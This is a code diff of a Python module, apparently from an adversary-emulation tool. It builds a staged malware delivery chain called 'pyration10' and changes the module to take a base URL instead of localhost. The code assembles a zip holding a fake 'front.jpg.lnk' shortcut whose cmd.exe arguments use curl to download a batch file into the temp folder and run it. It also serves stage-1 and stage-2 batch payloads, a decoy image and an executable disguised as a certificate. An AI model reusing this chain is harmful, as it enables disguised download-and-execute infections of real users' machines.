@@ -9,12 +9,8 @@ from helpers import *
 from model import AceFile, AceRoute
 
 
-def pyration10() -> List[AceRoute]:
+def pyration10(baseUrl) -> List[AceRoute]:
     routes = []
-
-    domain = 'http://localhost:5000/pyration10/'
-    #bat1Url = 'http://localhost:5000/pyration10/front.txt'
-    #bat2Url = 'http://localhost:5000/pyration10/c.bat'
 
     # Payload: unrar.cert: unrar.exe base64 encoded
     unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
@@ -36,25 +32,23 @@ def pyration10() -> List[AceRoute]:
     routes.append(serveHtml)
     
     # Payload: Fake JPG
-    pic: AceBytes = readFileContent('/pyration10/front.jpg')
+    pic: AceBytes = readFileContent('recipes/pyration10/front.jpg')
     serveHtml: AceRoute = AceRoute('/pyration10/front.jpg', pic)
     routes.append(serveHtml)
 
     # Stage 2: BAT
-    template = getTemplate('recipes/pyration10/', 'stage2.bat')
-    rendered = template.render(
-        assistUrl=domain + 'assist.rar',
-        setupUrl=domain + 'setup.rar',
-        certUrl=domain + 'unrar.cert',
+    rendered = renderTemplate('recipes/pyration10/', 'stage2.bat',
+        assistUrl=baseUrl + '/pyration10/assist.rar',
+        setupUrl=baseUrl + '/pyration10/setup.rar',
+        certUrl=baseUrl + '/pyration10/unrar.cert',
     )
     serveHtml: AceRoute = AceRoute('/pyration10/c.txt', rendered)
     routes.append(serveHtml)
 
     # Stage 1: BAT
-    template = getTemplate('recipes/pyration10/', 'stage1.bat')
-    rendered = template.render(
-        batUrl=domain + 'c.txt',
-        picUrl=domain + 'front.jpg',
+    rendered = renderTemplate('recipes/pyration10/', 'stage1.bat',
+        batUrl=baseUrl + '/pyration10/c.txt',
+        picUrl=baseUrl + '/pyration10/front.jpg',
     )
     stage1bat: AceFile = makeAceFile('front.bat', rendered)
     serveHtml: AceRoute = AceRoute('/pyration10/front.txt', rendered)
@@ -65,7 +59,7 @@ def pyration10() -> List[AceRoute]:
         name = "front.jpg.lnk",
         target = "c:\\Windows\\System32\\cmd.exe",
         arguments = "/c curl -k \"{}\" -o \"%tmp%/front.bat\" & cmd /c \"%tmp%/front.bat\"".format(
-            domain + 'front.txt',
+            baseUrl + '/pyration10/front.txt',
         ),
     )
     lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)
@@ -77,6 +71,6 @@ def pyration10() -> List[AceRoute]:
         ],
     )
     containerFile: AceFile = makeAceFile('documents.zip', container)
-    serveHtml: AceRoute = AceRoute('/documents.zip', containerFile)
+    serveHtml: AceRoute = AceRoute('/pyration-documents.zip', container, download=True, downloadName='documents.zip')
     routes.append(serveHtml)
     return(routes)
